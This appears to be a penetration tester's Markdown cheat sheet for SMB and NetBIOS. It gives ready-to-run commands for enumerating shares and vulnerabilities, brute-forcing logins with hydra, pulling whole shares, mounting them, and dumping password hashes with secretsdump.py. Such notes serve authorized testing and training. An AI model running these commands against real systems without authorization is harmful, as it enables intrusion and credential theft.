# Target SMB service

Default SMB port:       `445/tcp`
Default NetBIOS port:   `137/udp` and `139/tcp`

**Summery:**

- [Target SMB service](#target-smb-service)
  - [Enumeration Netbios](#enumeration-netbios)
    - [nbtscan](#nbtscan)
    - [nmblookup (nbtstat)](#nmblookup-nbtstat)
  - [Enumeration SMB/Netbios](#enumeration-smbnetbios)
    - [Nmap](#nmap)
    - [enum4linux](#enum4linux)
    - [enum4linux-ng](#enum4linux-ng)
    - [Smbmap](#smbmap)
  - [Connect](#connect)
    - [crackmapexec](#crackmapexec)
  - [Brut Force](#brut-force)
    - [hydra](#hydra)
    - [nmap](#nmap-1)
  - [Download all the dir](#download-all-the-dir)
  - [Mount remote dir](#mount-remote-dir)
  - [Dump Secrets](#dump-secrets)

## Enumeration Netbios

### nbtscan

```sh
sudo nbtscan -r TARGET_IP
sudo nbtscan -r TARGET_IP/range
```

### nmblookup (nbtstat)

```sh
nmblookup -A TARGET_IP
```

## Enumeration SMB/Netbios

### Nmap

```sh
nmap -p 445 --script smb-vuln* TARGET_IP

nmap -p 139,445 --script vuln TARGET_IP

nmap -p 139,445 --script smb-enum-shares TARGET_IP
nmap -p 139,445 --script smb-enum-shares --script-args=unsafe=1 -T5 TARGET_IP     # Unsafe
```

### enum4linux

```sh
enum4linux -a TARGET_IP
```

### enum4linux-ng

```sh
enum4linux-ng TARGET_IP
```

### Smbmap

```sh
smbmap -H TARGET_IP -u guest
smbmap -H TARGET_IP -R --depth 5

-R : PATH + the depth
```sh

```sh
smbmap -H TARGET_IP -u USERNAME -p PASSWORD
```

## Connect

Anonymous connection:

```sh
smbclient -L //TARGET_IP
smbclient \\\\TARGET_IP\\DIR
```

User connection:

```sh
smbclient -L //TARGET_IP -U User
```

Connect in SMB V1

```sh
smbclient \\\\TARGET_IP\\DIR --option='client min protocol=NT1'
```

Client mount:

> showmount

```sh
showmount -e TARGET_IP
```

### crackmapexec

```sh
cme smb TARGET_IP -u '' -p ''
cme smb TARGET_IP -u USERNAME -p 'PASSWORD' --shares
```

## Brut Force

### hydra

```sh
hydra -L user.txt -P pass.txt TARGET_IP smb
```

### nmap

```sh
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 TARGET_IP/24
```

## Download all the dir

> smbclient

```sh
smbclient \\\\TARGET_IP\\DIR

    > recurse ON
    > prompt OFF
    > mget *
```

> smbget

```bash
smbget -R 'smb://TARGET_IP/DIR' -U USERNAME
```

## Mount remote dir

```sh
mkdir /mnt/remoteDir
sudo mount -t cifs -o user=guest //TARGET_IP/<DIR> /mnt/remoteDir
```

## Dump Secrets

```SH
secretsdump.py 'DOAMIN/USERNAME:PASSWORD@TARGET_IP'
```
